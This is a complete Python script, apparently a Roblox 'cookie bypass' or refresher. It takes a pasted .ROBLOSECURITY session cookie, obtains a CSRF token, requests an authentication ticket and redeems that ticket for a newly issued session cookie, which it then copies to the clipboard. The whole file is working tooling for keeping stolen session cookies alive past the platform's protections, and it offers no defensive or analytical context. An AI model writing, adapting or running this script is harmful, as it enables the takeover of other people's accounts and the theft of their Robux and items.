import requests
class Bypass:
    def __init__(self, cookie) -> None:
        self.cookie = cookie
    
    def start_process(self):
        self.xcsrf_token = self.get_csrf_token()
        self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
        return self.get_set_cookie()
        
    def get_set_cookie(self):
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": self.rbx_authentication_ticket}
        )
        set_cookie_header = response.headers.get("set-cookie")
        if not set_cookie_header:
            return "Invalid Cookie"
        
        valid_cookie = set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]
        return f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{valid_cookie}"
        
    def get_rbx_authentication_ticket(self):
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket",
            headers={
                "rbxauthenticationnegotiation": "1",
                "referer": "https://www.roblox.com/camel",
                "Content-Type": "application/json",
                "x-csrf-token": self.xcsrf_token
            },
            cookies={".ROBLOSECURITY": self.cookie}
        )
        assert response.headers.get("rbx-authentication-ticket"), "An error occurred while getting the rbx-authentication-ticket"
        return response.headers.get("rbx-authentication-ticket")
        
    def get_csrf_token(self) -> str:
        response = requests.post("https://auth.roblox.com/v2/logout", cookies={".ROBLOSECURITY": self.cookie})
        xcsrf_token = response.headers.get("x-csrf-token")
        assert xcsrf_token, "An error occurred while getting the X-CSRF-TOKEN. Could be due to an invalid Roblox Cookie"
        return xcsrf_token

def install_pyperclip():
    try:
        import pyperclip
    except ImportError:
        print("Module 'pyperclip' not found. Loading installation...")
        import subprocess
        subprocess.check_call(["python", "-m", "pip", "install", "pyperclip"])
        print("installation successful")

def main():
    install_pyperclip()
    import pyperclip
    while True:
        print("Paste the roblox cookie or type (exit) to quit")
        cookie = input().strip()

        if cookie.lower() == "exit":
            break

        bypass = Bypass(cookie)

        try:
            result = bypass.start_process()
            print("Result:")
            print(result)

            if not result.startswith("Invalid Cookie"):
                pyperclip.copy(result)
                print("Result copied to clipboard.")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()